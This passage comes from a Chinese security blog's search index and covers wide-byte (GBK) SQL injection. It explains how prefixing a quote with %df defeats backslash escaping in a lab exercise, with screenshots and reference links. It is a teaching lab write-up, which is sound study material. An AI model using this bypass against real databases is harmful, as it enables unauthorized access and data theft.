<h3 id="八-、宽字节注入"><a href="#八-、宽字节注入" class="headerlink" title="(八)、宽字节注入"></a>(八)、宽字节注入</h3><p>原理：当对特殊字符使用反斜杠“\”来处理特殊字符时，而数据库编码又为GBK,这时可能存在宽字节注入</p>
<h4 id="1、靶场练习-1"><a href="#1、靶场练习-1" class="headerlink" title="1、靶场练习"></a>1、靶场练习</h4><p>先添加一个单引号，发现边成了1&#39;了。</p>
<center>
<img src="/MySQL-injection/25.png" widith="50%">
</center>

<p>这时候在单引号前加上%df，因为反斜杠的url编码为 %5c，而%df%5c在GBK编码里会变成一个中文字符。这时就会达到一个绕过的效果。</p>
<center>
<img src="/MySQL-injection/26.png" widith="50%">
</center>

<p>查看当前的数据库，可以判断我们输入的语句是成功执行的</p>
<center>
<img src="/MySQL-injection/27.png" widith="50%">
</center>  
<br>  
<br>  

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vemFuZS1zL2FydGljbGVzLzEyMzcxODIwLmh0bWw=">https://www.cnblogs.com/zane-s/articles/12371820.html<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MS9hcnRpY2xlL2RldGFpbHMvMTEyNzcxNzg4">https://blog.csdn.net/weixin_46706771/article/details/112771788<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL3d3dy5iZWVzZnVuLmNvbS8yMDE3LzAzLzI4L015U1FMJUU2JUIzJUE4JUU1JTg1JUE1JUU3JUIzJUJCJUU1JTg4JTk3JUU0JUI5JThCJUU0JUJBJThDJUU2JUFDJUExJUU2JUIzJUE4JUU1JTg1JUE1LSVFNCVCOCU4OS8=">http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly96Z2FvLnRvcC9zcWwlRTYlQjMlQTglRTUlODUlQTUlRTQlQjklOEIlRTUlQTAlODYlRTUlOEYlQTAlRTYlQjMlQTglRTUlODUlQTUlRTUlQUQlQTYlRTQlQjklQTAv">https://zgao.top/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
</search>
